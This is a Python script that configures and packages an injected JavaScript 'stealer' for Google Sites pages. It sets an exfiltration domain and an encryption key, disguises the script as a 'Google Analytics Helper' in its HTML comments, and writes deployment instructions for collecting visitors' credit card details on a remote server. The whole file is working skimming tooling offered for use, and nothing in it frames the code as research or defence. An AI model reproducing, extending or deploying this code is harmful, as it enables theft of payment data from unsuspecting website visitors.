#!/usr/bin/env python3
"""
Google Sites Injector
Automatically injects the stealer.js script into Google Sites pages
"""
import re
import sys
from pathlib import Path

def generate_injection_code(public_key_b64, exfil_domain, debug=False):
    """
    Generate the JavaScript code with actual configuration values
    """
    # Read the stealer.js template
    template_path = Path(__file__).parent.parent / 'client' / 'stealer.js'
    with open(template_path, 'r', encoding='utf-8') as f:
        template = f.read()
    
    # Replace configuration placeholders
    replacements = {
        '${EXFIL_DOMAIN}': exfil_domain,
        '${PUBLIC_KEY}': public_key_b64,
        '${DEBUG_MODE}': 'true' if debug else 'false'
    }
    
    code = template
    for placeholder, value in replacements.items():
        code = code.replace(placeholder, value)
    
    return code

def create_google_sites_injection():
    """
    Create injection code for Google Sites
    Google Sites allows custom JavaScript via Embed HTML
    """
    # Configuration - EDIT THESE VALUES
    CONFIG = {
        'PUBLIC_KEY': 'YOUR_PUBLIC_KEY_BASE64_HERE',  # From keys/public_key.txt
        'EXFIL_DOMAIN': 'your-domain.com',  # Your server domain
        'DEBUG': False
    }
    
    injection_js = generate_injection_code(
        CONFIG['PUBLIC_KEY'],
        CONFIG['EXFIL_DOMAIN'],
        CONFIG['DEBUG']
    )
    
    # Minify for production (optional)
    if not CONFIG['DEBUG']:
        # Simple minification - remove comments and extra whitespace
        injection_js = re.sub(r'//.*', '', injection_js)
        injection_js = re.sub(r'/\*.*?\*/', '', injection_js, flags=re.DOTALL)
        injection_js = re.sub(r'\s+', ' ', injection_js)
        injection_js = injection_js.strip()
    
    # Create HTML embed code
    html_embed = f'''<!-- Google Analytics Helper -->
<script>
{injection_js}
</script>
<!-- End Google Analytics Helper -->'''
    
    return html_embed

def main():
    """Main function"""
    print("Google Sites Financial Data Collector - Injection Generator")
    print("=" * 60)
    
    # Check if public key exists
    public_key_path = Path(__file__).parent.parent / 'keys' / 'public_key.txt'
    if not public_key_path.exists():
        print(f"ERROR: Public key not found at {public_key_path}")
        print("Please run server/app.py first to generate keys")
        sys.exit(1)
    
    # Read public key
    with open(public_key_path, 'r') as f:
        public_key_b64 = f.read().strip()
    
    # Get configuration from user
    exfil_domain = input("Enter your server domain (e.g., analytics.yourdomain.com): ").strip()
    debug_mode = input("Enable debug mode? (y/n): ").lower().strip() == 'y'
    
    # Generate injection code
    injection_js = generate_injection_code(public_key_b64, exfil_domain, debug_mode)
    
    # Create output files
    output_dir = Path(__file__).parent / 'output'
    output_dir.mkdir(exist_ok=True)
    
    # Save raw JavaScript
    js_file = output_dir / 'stealer_configured.js'
    with open(js_file, 'w', encoding='utf-8') as f:
        f.write(injection_js)
    
    # Save HTML embed for Google Sites
    html_embed = f'''<!-- Financial Data Collector -->
<!-- Add this code to your Google Sites via Embed HTML -->
<script>
{injection_js}
</script>
<!-- End Financial Data Collector -->'''
    
    html_file = output_dir / 'google_sites_embed.html'
    with open(html_file, 'w', encoding='utf-8') as f:
        f.write(html_embed)
    
    # Save instructions
    instructions = f'''=== INSTRUCTIONS FOR GOOGLE SITES DEPLOYMENT ===

1. LOGIN to your Google Sites editor
2. Go to the page where you want to collect financial data
3. Click "Insert" → "Embed" → "Embed code"
4. Paste the entire code from 'google_sites_embed.html'
5. Click "INSERT"
6. Publish your site

=== SERVER SETUP ===

1. Deploy the server code (in server/ folder) to a VPS
2. Configure domain: {exfil_domain} to point to your server IP
3. Install dependencies: pip install -r requirements.txt
4. Configure environment variables in .env file
5. Generate SSL certificates (for HTTPS):
   - Let's Encrypt: certbot --nginx
   - Or self-signed: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
6. Start server: python app.py

=== TESTING ===

1. Visit your Google Site
2. Fill out a form with credit card details
3. Check server logs and collected_data/ folder
4. Data should appear in JSON format

=== SECURITY NOTES ===

- Server runs on HTTPS (required for modern browsers)
- All data encrypted with RSA-2048
- No data stored in Google infrastructure
- Server only accessible via your domain
- Rotate keys periodically

=== FILES GENERATED ===

1. {js_file} - Configured JavaScript
2. {html_file} - HTML embed for Google Sites
3. Public key: {public_key_path}

=== NEXT STEPS ===

1. Deploy server to VPS with domain
2. Insert embed code into Google Sites
3. Test with dummy data
4. Monitor collected_data/ folder
'''
    
    instructions_file = output_dir / 'DEPLOYMENT_INSTRUCTIONS.txt'
    with open(instructions_file, 'w', encoding='utf-8') as f:
        f.write(instructions)
    
    print(f"\n✅ Files generated in: {output_dir}")
    print(f"\n📄 Instructions: {instructions_file}")
    print(f"\n📋 HTML Embed: {html_file}")
    print(f"\n🔑 Using public key from: {public_key_path}")
    print(f"\n🌐 Exfiltration domain: {exfil_domain}")
    print(f"\n🔧 Debug mode: {'ENABLED' if debug_mode else 'DISABLED'}")
    print("\n⚠️  IMPORTANT: Configure your server domain DNS before testing!")

if __name__ == '__main__':
    main()